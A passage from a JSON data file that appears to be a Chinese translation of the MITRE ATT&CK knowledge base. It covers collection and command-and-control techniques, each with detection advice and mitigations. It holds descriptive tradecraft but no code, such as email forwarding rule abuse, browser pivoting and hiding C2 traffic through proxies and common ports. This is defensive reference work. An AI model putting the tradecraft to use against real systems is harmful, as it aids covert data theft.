		"dataSources": ["网络进程使用", "认证日志", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>已对系统登录账号开启了日志功能，且日志集中收集。Windows日志功能可以收集用于横向移动的账号的成功和失败日志，并且这些日志是通过Windows事件转发等工具收集。监控远程登录事件和关联的SMB活动来查看是否有文件传输及远程进程执行活动。监控命令行界面上用来访问远程共享的工具和命令（比如Net），以及监控用于发现远程可访问系统的发现技术。</p>",
		"mitigations": [{
			"name": "密码策略",
			"description": "不要在系统之间复用本地管理员账号密码。确保密码的复杂性和唯一性，以防止被破解或猜中。"
		}, {
			"name": "特权账号管理",
			"description": "拒绝远程使用本地管理员凭据登录系统。不允许域用户账号位于多个系统的本地管理员群组中。"
		}],
		"tactics": ["TA0008"]
	},
	"name": "Windows管理员共享"
}, {
	"id": "T1123",
	"description": "<p>攻击者可能会利用计算机的外围设备（例如，麦克风和网络摄像头）或应用程序（例如，语音和视频呼叫服务）来捕捉音频记录，收听敏感交谈内容从而收集信息。</p><p>恶意软件或脚本可能会通过操作系统或应用提供的可用API与设备进行交互来捕捉音频。音频文件可能会写入磁盘并在以后被泄漏。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["API监控", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>此技术可能很难检测到，因为使用的API各不相同。API调用相关的遥测数据可能并无用处，具体取决于系统的使用方式。但这些遥测数据可能会为系统上发生的其他潜在恶意活动提供上下文。</p><p>与此技术使用相关的行为包括未知或异常进程调用API来访问麦克风、录音设备或录音软件，以及进程周期性地将包含音频数据的文件写入磁盘。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "音频捕捉"
}, {
	"id": "T1119",
	"description": "<p>一旦在系统或网络中建立，攻击者就可以使用自动化技术来收集内部数据。方法包括使用脚本在特定时间间隔搜索符合条件（例如文件类型，位置或名称）的信息。此功能也可以内置到远程访问工具中。</p><p>该技术可以结合使用其他技术，例如文件和目录发现以及远程文件复制，来识别和移动文件。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "数据丢失防御", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>根据所使用的方法，操作可能包括在命令行界面上使用批处理文件或脚本中的通用文件系统命令和参数。一系列类似操作可能不正常，具体取决于系统和网络环境。自动化收集技术可与其他技术一起使用，如分布处理数据技术。文件访问监控过程中，如果发现异常进程一次性打开多个文件并拷贝到文件系统上另外一个位置，则可能表示有自动收集行为发生。攻击者可能会使用带有内置功能的远程访问工具来直接与Windows API交互以收集数据，也可以使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取数据。</p>",
		"mitigations": [{
			"name": "敏感信息加密",
			"description": "敏感信息的加密和系统外存储可能是减轻文件收集影响的一种方法，但是如果入侵持续了很长时间并且攻击者能够通过其他方式发现和访问数据，则这种方法可能没法阻止攻击者获取信息。对某些加密文档使用强密码可以阻止攻击者使用暴力破解技术来在线下破解密码。"
		}, {
			"name": "远程数据存储",
			"description": "敏感信息的加密和系统外存储可能是减轻文件收集影响的一种方法，但是如果入侵持续了很长时间并且攻击者能够通过其他方式发现和访问数据，则这种方法可能没法阻止攻击者获取信息。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "自动化收集"
}, {
	"id": "T1115",
	"description": "<p>用户在应用间复制信息时，攻击者可能会从用户测收集Windows剪贴板上的数据。</p><p>Windows</p><p>应用可以使用Windows API来访问剪贴板数据。</p><p>Mac</p><p>OSX命令<code>pbpaste</code>可用来获取剪贴板内容</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"dataSources": ["API监控"]
	},
	"relations": {
		"detection": "<p>访问剪贴板是Windows系统上许多应用的合法功能。如果组织选择监控此行为，则可能需要找出数据与其他可疑或非用户驱动的活动之间的关系。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "剪贴板数据"
}, {
	"id": "T1530",
	"description": "<p>攻击者可能会访问不安全云存储中的数据对象。</p><p>许多云服务提供商提供在线数据存储解决方案，如Amazon S3，Azure存储和Google云存储。这些解决方案与其他存储解决方案（例如SQL或Elasticsearch）的区别在于他们没有总体的应用程序。这些解决方案中的数据可以使用云提供商的API直接检索。解决方案提供商通常会提供安全指南，帮助最终用户配置系统。</p><p>最终用户的错误配置是一个普遍问题。云存储受到不恰当保护的事件屡见不鲜（通常是无意中允许未经身份认证的用户进行公共访问，或者允许所有用户都可以访问），允许公开访问信用卡，个人身份信息，病历以及其他敏感信息。攻击者还可能在源存储库，日志或以其他方式获取泄漏的凭据，从而获取对受到访问权限控制的云存储对象的访问权限。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["Stackdriver日志", "Azure活动日志", "AWS CloudTrail日志"]
	},
	"relations": {
		"detection": "<p>监控对云提供商存储服务的异常查询。如果有活动来自意料之外的源，则表示设置了不正确的权限来允许访问数据。此外，如果某个用户在对某个对象的访问尝试失败后提升了权限并再次访问同一个对象，则是可疑活动。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "经常检查云存储上的权限，确保已设置适当的权限来拒绝打开资源或拒绝对资源未经授权的访问。"
		}, {
			"name": "敏感信息加密",
			"description": "加密静态存储在云存储中的数据。大多数提供商可以轮流管理加密密钥。至少要确保针对存储违规事件的响应计划应包括轮换秘钥并测试对客户端应用程序的影响。"
		}, {
			"name": "网络流量过滤",
			"description": "云服务提供商支持基于IP地址限制云资源的访问。请考虑将IP地址白名单和用户账户管理结合使用，以确保数据访问仅限于预期IP地址范围内的有效用户，从而减少凭据被盗用来访问数据的可能。"
		}, {
			"name": "多因子认证",
			"description": "请考虑使用多因子身份认证来限制对资源以及云存储API的访问。"
		}, {
			"name": "文件和目录权限限制",
			"description": "对存储系统和对象使用访问控制列表。"
		}, {
			"name": "用户账户管理",
			"description": "配置云存储访问的用户权限组和角色。实施严格的身份和访问管理（IAM）控件来防止对存储解决方案的不必要访问（除了需要访问存储解决方案的应用程序、用户和服务以外）。确保颁发临时访问令牌而不是永久凭证，尤其是在将访问权限授予内部安全边界之外的实体时。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "云存储对象数据"
}, {
	"id": "T1213",
	"description": "<p>攻击者可能会利用信息库来挖掘有价值的信息。信息库是信息存储工具，通常用于促进用户之间的协作或信息共享，用于存储有助于攻击者实现进一步目标的各种数据，或者用于直接访问目标信息。</p><p>攻击者也可能会从托管在云基础设施或软件即服务（SaaS）应用程序上的共享存储库中收集信息，因为存储是云服务和系统的一个更基本的要求。</p><p>以下是可以在信息库中找到、对攻击者有价值的示例信息简要列表：</p><p>·         策略，过程和标准</p><p>·         物理/逻辑网络图</p><p>·         系统架构图</p><p>·         技术系统文档</p><p>·         测试/开发凭据</p><p>·         工作/项目进度表</p><p>·         源代码片段</p><p>·         指向网络共享和其他内部资源的链接</p><p>具体的通用信息库包括：</p><p>Microsoft SharePoint</p><p>存在于许多企业网络中，通常用于存储和共享大量文档。</p><p>Atlassian Confluence</p><p>通常与Atlassian JIRA一起在开发环境中使用，通常用于存储与开发相关的文档。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS", "SaaS", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "AWS CloudTrail日志", "Stackdriver日志", "OAuth审核日志", "应用日志", "认证日志", "数据泄漏防护", "第三方应用日志"]
	},
	"relations": {
		"detection": "<p>由于信息库通常具有相当大的用户群，因此检测恶意使用并非易事。至少应该密切监控和警告对特权用户（例如，Active Directory域企业管理员）执行的信息库的访问，因为这些类型的帐户通常不应该用于访问信息库。如果该功能存在，监控和警告正在检索和查看大量文档和页面的用户可能是有价值的，因为此行为可能表示有人正使用编程方法检索信息库中的所有数据。在高成熟度环境中，可以利用用户行为分析（UBA）平台来检测和警告用户异常。</p><p>可以将Microsoft SharePoint中的用户访问日志功能配置为上报对某些页面和文档的访问。也可以将Atlassian Confluence中的用户访问日志功能配置为通过AccessLogFilter上报对某些页面和文档的访问。需要额外的日志存储和分析基础架构才能实现更强大的检测功能。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "考虑定期检查关键和敏感信息库的帐户和权限。"
		}, {
			"name": "用户帐户管理",
			"description": "实施最低权限原则。考虑实施包括身份验证和授权的访问控制机制。"
		}, {
			"name": "用户培训",
			"description": "开发和发布定义信息库中可存储信息的策略。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "信息库数据"
}, {
	"id": "T1005",
	"description": "<p>攻击者可能会从本地系统数据源收集敏感数据，例如数据渗漏之前留存在系统上的文件系统或信息数据库。</p><p>攻击者通常会在他们所攻击的计算机上搜索文件系统来查找感兴趣的文件。他们可以使用命令行界面（例如cmd）来执行此操作，该界面提供与文件系统交互从而收集信息的功能。某些攻击者也可能在本地系统上使用自动化收集方法。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数来查看是否有从系统收集文件的相关操作。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "本地系统数据"
}, {
	"id": "T1039",
	"description": "<p>攻击者可能会在数据渗漏之前从当前系统访问共享网络驱动器（主机共享目录，网络文件服务器等）从而收集远程系统中的敏感数据。</p><p>攻击者可能会在他们所攻击的计算机上搜索网络共享来查找感兴趣的文件。他们可能会使用交互式命令shell和cmd的常用功能来收集信息。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数来查看是否有从网络共享收集文件的相关操作。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "共享网络驱动器数据"
}, {
	"id": "T1025",
	"description": "<p>在“渗透”之前，攻击者可能会从连接到入侵系统的任何可移动媒体（光盘驱动器，USB存储器等）收集敏感数据。</p><p>攻击者可能会在他们已经入侵的计算机上搜索连接的可移动媒体，查找他们感兴趣的文件。他们可能会使用交互式命令shell，并且可能会使用cmd内的功能来收集信息。一些攻击者还可能会在可移动媒体上使用自动收集功能。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控进程和命令行参数来查看是否有从系统连接的可移动媒体收集文件的相关操作。带内置功能的远程访问工具可以直接与Windows API交互，在典型系统实用程序之外执行这些功能。还可以通过Windows系统管理工具（如Windows Management Instrumentation和Powershell）来创建服务。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "可移动媒体数据"
}, {
	"id": "T1074",
	"description": "<p>渗漏之前，收集的数据暂存在中央位置或目录中。数据可以保存在不同文件中，也可以通过数据压缩或数据加密等技术合并到一个文件。</p><p>攻击者可能会使用交互式命令shell，并且可能会使用cmd和bash中的通用功能将数据复制到一个临时位置。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>似乎正在从不同位置读取文件并写入同一目录或文件的进程可能表示正在分步处理数据，尤其是怀疑它们对文件执行加密或压缩时。例如：7zip，RAR，ZIP或zlib。监控公共可写目录、中心位置以及常用的暂存目录（回收站和临时文件夹等），定期检查是否有数据压缩或加密现象，因为这可能表示有数据暂存。</p><p>监控进程和命令行参数来查看是否有收集和合并文件的相关操作。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集数据并复制到某路径，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取数据并分步处理。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "数据暂存"
}, {
	"id": "T1114",
	"description": "<p>攻击者可能会锁定目标用户邮件来收集敏感信息。</p><p>他们可以从用户系统获取包含邮件数据的文件，例如Outlook存储或缓存文件.pst和.ost。</p><p>攻击者可能会利用用户凭据，直接与Exchange服务器交互来获取网络中的信息。攻击者还可能访问面向外部的Exchange服务或Office 365，使用凭据或访问令牌来读取邮件。诸如MailSniper的工具可用来自动搜索特定关键词。</p><p>邮件转发规则</p><p>攻击者还可能会滥用邮件转发规则来监控攻击目标的活动，窃取信息，以及进一步获取目标或是目标所属组织的相关情报，从而进一步实施漏洞攻击或其他操作。Outlook以及Outlook Web应用（OWA）允许用户为各种邮件功能创建收件箱规则，包括邮件转发到其他收件人的规则。邮件可以转发给内部或外部收件人，并且对此规则的范围没有限制。管理员也可以为用户账户创建转发规则。管理员创建的同一规则对于不同账户来说有相同的注意事项及效果。</p><p>组织内的任何用户或管理员（或是已获取有效凭据的攻击者）都可以创建自动将所有邮件转发到其他收件人的规则，根据发件人将邮件转发到其他位置的规则，等等。</p>",
	"details": {
		"platform": ["Windows", "Office 365"],
		"permissionRequired": ["用户"],
		"dataSources": ["Office 365跟踪日志", "邮件服务器", "邮件网关", "认证日志", "文件监控", "进程监控", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>攻击者可以采用多种方式从目标收集电子邮件。针对每种方式都有不同的检测机制。</p><p>以下信息都可能表示有恶意活动发生：访问本地系统邮件文件并将数据渗漏；异常进程连接到网络内电子邮件服务器；在面向公众的webmail服务器上使用异常访问模式或身份认证。</p><p>监控进程和命令行参数来查看是否有收集本地邮件文件的相关操作。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p><p>检测具有挑战性，因为自动转发规则转发的所有消息都与手动转发的消息有相同的表示形式。 用户可能没意识到添加了这样的自动转发规则，并且也不会怀疑自己的帐户已被盗用；仅电子邮件转发规则不会影响电子邮件帐户的正常使用方式或操作。</p><p>自动转发的消息通常包含特定的、可检测到的产物，这些产物可能出现在头中并且是某平台特有的。例如， X-MS-Exchange-Organization-AutoForwarded设置为true，X-MailFwdBy和X-Forwarded-To。参数forwardingSMTPAddress用在管理员管理的（而非用户操作的）转发进程。所有发往某邮箱的邮件都会转发到指定的SMTP地址。但是，与典型的客户端侧规则不同，在该邮箱中邮件不会显示为已转发；它看起来就像是直接发送到指定的目标邮箱一样。如果检测到大量带有X-MS-Exchange-Organization-AutoForwarded头（表示自动转发）的邮件，但没有相应数量的邮件与转发的邮件外观相匹配，则可能表示需要在管理员级别（而非用户级别）做进一步调查。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "企业电子邮件解决方案有监控机制，该机制可能提供定期审核自动转发规则的功能。"
		}, {
			"name": "敏感信息加密",
			"description": "加密的使用为通过电子邮件发送敏感信息增加了一层安全性。使用公共密钥密码术进行加密需要攻击者获取私有证书以及用于解密消息的加密密钥。"
		}, {
			"name": "多因子认证",
			"description": "对面向公众的webmail服务器使用多因子身份认证是推荐的最佳实践，可以最大程度地减少用户名和密码对于攻击者的用处。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "邮件收集"
}, {
	"id": "T1185",
	"description": "<p>攻击者可能会利用浏览器软件中的安全漏洞和固有功能，作为浏览器中间人来改变内容，修改行为，并拦截信息。</p><p>一个具体的例子是，攻击者将恶意软件注入允许他们接替用户cookie，HTTP会话以及SSL客户端证书的浏览器，并使用该浏览器来进入经过身份验证的Intranet。</p><p>浏览器透视需要SeDebugPrivilege和高完整性进程才能执行。浏览器流量通过设置HTTP代理从攻击方的浏览器通过用户的浏览器转入，HTTP代理将重定向任何HTTP和HTTPS流量。这不会以任何方式改变用户的流量。一旦浏览器关闭，代理连接就会被切断。无论代理注入的是哪个浏览器进程，攻击者都会收到该进程的安全上下文。浏览器通常为每个打开的选项卡创建一个新进程，并相应地分离权限和证书。攻击者可以使用这些权限浏览到可通过浏览器访问的Intranet上的任何资源，以及浏览器具有足够权限的资源，例如Sharepoint或webmail。浏览器透视也消除了双因子身份验证提供的安全性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["认证日志", "网络抓包", "进程监控", "API监控"]
	},
	"relations": {
		"detection": "<p>这是一种很难检测的技术，因为攻击者流量会被正常的用户流量掩盖。没有创建新进程，也没有其他软件接触磁盘。身份验证日志可用于审核对特定web应用程序的登录，但如果活动是典型用户行为，则可能难以区分恶意登录与正常登录。监控针对浏览器应用程序的进程注入。</p>",
		"mitigations": [{
			"name": "用户帐户管理",
			"description": "由于浏览器透视需要高完整性进程才能启动，因此限制用户权限和解决权限提升和绕过用户帐户控制机会可能会限制此技术的曝光。"
		}, {
			"name": "用户培训",
			"description": "定期或在不需要时请关闭所有浏览器会话。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "MitB"
}, {
	"id": "T1113",
	"description": "<p>攻击者可能会在操作过程中尝试对桌面进行屏幕截图以收集信息。在入侵后使用的远程访问工具中可能会包括屏幕截图功能。</p><p>Mac</p><p>在OSX上，<code>screencapture</code>命令用来屏幕截图。</p><p>Linux</p><p>Linux上自带<code>xwd</code>命令用于屏幕截图。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["API监控", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>屏幕截图行为的监控取决于从操作系统获取数据以及写输出文件的方法。检测方法可以包括调用用于获取图像数据的API来收集异常进程信息，以及监控写入磁盘的图像文件。监控的数据可能需要与其他事件相关联以识别恶意活动，具体取决于给定网络环境中此行为的合法性。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "屏幕截图"
}, {
	"id": "T1125",
	"description": "<p>攻击者可能会利用计算机的周边设备（例如，集成相机或网络摄像头）或应用程序（例如，视频通话服务）来捕获视频记录，从而收集信息。还可能以指定的间隔从设备或应用程序捕获图像，代替视频文件。</p><p>恶意软件或脚本可能会用于通过操作系统或应用程序提供的可用API与设备交互来捕获视频或图像。视频或图像文件可能会写入磁盘并在以后进行渗透。由于使用了特定的设备或应用程序进行视频录制，而不是捕获受害者的屏幕，因此该技术与“屏幕截图”有所不同。</p><p>在macOS中，有一些不同的恶意软件样本可记录用户的网络摄像头，如FruitFly和Proton。</p>",
	"details": {
		"platform": ["Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "文件监控", "API监控"]
	},
	"relations": {
		"detection": "<p>此技术可能很难检测到，因为使用的API各不相同。API调用相关的遥测数据可能并无用处，具体取决于系统的使用方式。但这些遥测数据可能会为系统上发生的其他潜在恶意活动提供上下文。</p><p>与此技术使用相关的行为包括未知或异常进程调用API来访问摄像机、录音设备或录音软件，以及进程周期性地将包含视频或相机图像数据的文件写入磁盘。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0009"]
	},
	"name": "视频采集"
}, {
	"id": "T1043",
	"description": "<p>攻击者可能会通过通用端口进行通信来绕过防火墙或网络检测系统，并混入正常的网络活动来避免更详细的检查。他们可能会使用如下通用开放端口：</p><p>·         TCP:80 (HTTP)</p><p>·         TCP:443 (HTTPS)</p><p>·         TCP:25 (SMTP)</p><p>·         TCP/UDP:53 (DNS)</p><p>攻击者可能会使用端口关联的协议或完全不同的协议。</p><p>飞地内的连接（例如，代理节点或枢纽节点与其他节点之间的连接）使用的通用端口示例如下：</p><p>·         TCP/UDP:135 (RPC)</p><p>·         TCP/UDP:22 (SSH)</p><p>·         TCP/UDP:3389 (RDP)</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "网络进程使用", "进程监控"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}, {
			"name": "网络分区",
			"description": "配置内部和外部防火墙来阻止与网络协议相关但非特定网段必需的通用端口上的流量。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "通用端口"
}, {
	"id": "T1092",
	"description": "<p>攻击者可以使用可移动媒体在断开的网络上的受入侵主机之间执行命令与控制，从而将命令从一个系统传输到另一个系统。前提是这俩个系统都已遭受入侵，其中连接互联网的系统可能首先遭到入侵，而另一个系统是攻击者使用“通过可移动媒体复制”技术进行横向移动而入侵。命令和文件将从断开连接的系统中继到攻击者可直接访问的、连接互联网的系统。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["文件监控", "数据泄漏防护"]
	},
	"relations": {
		"detection": "<p>监控可移动媒体上的文件访问。检测安装可移动媒体时执行的进程。</p>",
		"mitigations": [{
			"name": "禁用功能或删除程序",
			"description": "如果没有必要，请禁用Autoruns。"
		}, {
			"name": "操作系统配置",
			"description": "如果业务运营不需要可移动媒体，则在组织策略级别上禁止或限制可移动媒体。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "经由可移动媒体通信"
}, {
	"id": "T1090",
	"description": "<p>攻击者可能会使用连接代理在系统之间定向网络流量，或者充当与命令和控制服务器进行网络通信的中介，以避免直接连接至基础设施。许多工具可通过代理或端口重定向来重定向流量，包括HTRAN，ZXProxy和ZXPortMap。攻击者使用这些类型的代理来管理命令和控制通信，减少同时出站的网络连接数量，在连接丢失的情况下提供弹性，或者使用现有攻击目标之间受信任的通信路径以避免被怀疑。</p><p>外部连接代理用于掩盖C2流量的目的地，通常使用端口重定向来实现。攻击者可以使用目标环境之外的已入侵系统或使用已购买的基础设施（如：云化资源或虚拟专用服务器）来实现此目的。他们可能是基于入侵系统与代理之间的连接被调查的可能性来挑选代理。他们会选择调查可能性小的代理。攻击目标系统将直接与Internet上的外部代理通信，然后由代理将通信转发到C2服务器。</p><p>内部连接代理可用于接受来自受入侵系统的内部连接。攻击者可能会将已入侵的内部系统作为代理来隐藏C2流量的真实目的地。代理可将流量从网络内已遭入侵的系统重定向到外部C2服务器，使得恶意流量很难被发现。此外，该网络可用于将信息从一个系统中继到另外一个系统，以避免将流量广播到所有系统。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络进程使用", "进程监控", "Netflow/Enclave技术网络流分析", "网络抓包"]
	},
	"relations": {
		"detection": "<p>如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。如果有网络活动与通常需要用户指挥的进程中用户驱动的操作不相关，则是可疑的。</p><p>分析网络数据中不常见的数据流（例如，一个客户端发送的数据比从服务器接收的数据要多得多，或者一个客户端给另外一个不应该或经常不相互通信的客户端发送了数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定C&C协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011", "TA0005"]
	},
	"name": "连接代理"
}, {
	"id": "T1094",
	"description": "<p>攻击者可能会使用自定义命令与控制协议进行通信，而不是在现有的标准应用层协议中封装命令或数据。实现包括模仿众所周知的协议或在TCP/IP/其它标准网络堆栈提供的基本协议之上开发自定义协议（包括原始套接字）。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "进程网络访问", "进程监控", "主机网络接口", "网络入侵检测系统", "网络协议分析"]
	},
	"relations": {
		"detection": "<p>分析网络流量来查看是否有ICMP消息或包含异常数据的其他协议的网络流量，或者通常在网络内部或网络中看不到的网络流量。</p><p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p><p>监控和调查与启用和利用备用通信通道相关的API函数调用。</p>",
		"mitigations": [{
			"name": "过滤网络流量",
			"description": "过滤网络流量以查找异常或非标准协议。"
		}, {
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定C&C协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}, {
			"name": "网络分段",
			"description": "正确配置防火墙和代理，以限制仅通过必要端口和适当的网络网关系统来传出流量。还要确保配置主机仅通过授权接口进行通信。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "自定义C&C协议"
}, {
	"id": "T1024",
	"description": "<p>攻击者可能会使用自定义加密协议或算法来隐藏命令与控制流量。一个简单的方案，例如用固定密钥对明文进行异或，将产生非常弱的密文。</p><p>自定义加密方案的复杂程度可能不同。恶意软件样本的分析和逆向工程可能足以发现所使用的算法和加密密钥。</p><p>某些攻击者还可能会尝试实现他们自己版本的众所周知的加密算法，而不是使用已知的实现库，这可能导致意想不到的错误。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "Netflow/Enclave技术网络流分析", "进程使用网络", "恶意代码逆向工程", "进程监控"]
	},
	"relations": {
		"detection": "<p>如果恶意软件使用带有对称密钥的自定义加密协议，则有可能从样本中获取算法和密钥来解码网络流量从而检测恶意软件的通信签名。</p><p>通常可以分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。由于使用的自定义协议可能不符合典型的协议标准，因此可能有机会在网络级别识别流量以进行检测。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定C&C协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "自定义加密协议"
}, {
	"id": "T1132",
	"description": "<p>使用标准数据编码系统对命令与控制（C2）信息进行编码。数据编码的使用可能遵循现有协议规范，包括使用ASCII，Unicode，Base64，MIME，UTF-8或其他二进制到文本和字符编码系统。某些数据编码系统也可能导致数据压缩，例如gzip。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["网络抓包", "进程使用网络", "进程监控", "网络协议分析"]
	},
	"relations": {
		"detection": "<p>分析网络数据中不常见的数据流（例如，客户端发送的数据明显多于从服务器接收的数据）。如果以前不和网络通信的进程现在使用了网络，或者出现了以前从未见过的进程，则是可疑的。分析数据包内容以检测未遵循所使用端口的预期协议而进行的通信。</p>",
		"mitigations": [{
			"name": "网络入侵防御",
			"description": "使用可以通过网络签名来识别特定攻击者恶意软件流量的网络入侵检测和防御系统来缓解网络级别活动的影响。签名通常是协议中的唯一指示符，可能基于攻击者或工具的特定C&C协议，并且在各种恶意软件系列和版本中可能会有所不同。攻击者可能会随着时间的推移更改工具C&C签名，或者构建协议来逃避常见防御工具的检测。"
		}],
		"tactics": ["TA0011"]
	},
	"name": "数据编码"
}, {
	"id": "T1001",
	"description": "<p>攻击者可能会试图隐藏（但不一定加密）C&amp;C通信来使得内容更难以被发现或解密，使得通信不那么明显，并防止命令被看到。方法有多种多样，例如添加垃圾数据到协议流量，使用隐写术，混合合法流量和C&amp;C通信流量，或使用非标准数据编码系统（例如使用修改的Base64来对HTTP请求消息主体进行编码）。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"dataSources": ["网络抓包", "网络进程使用", "进程监控", "网络协议分析"]
	},
	"relations": {
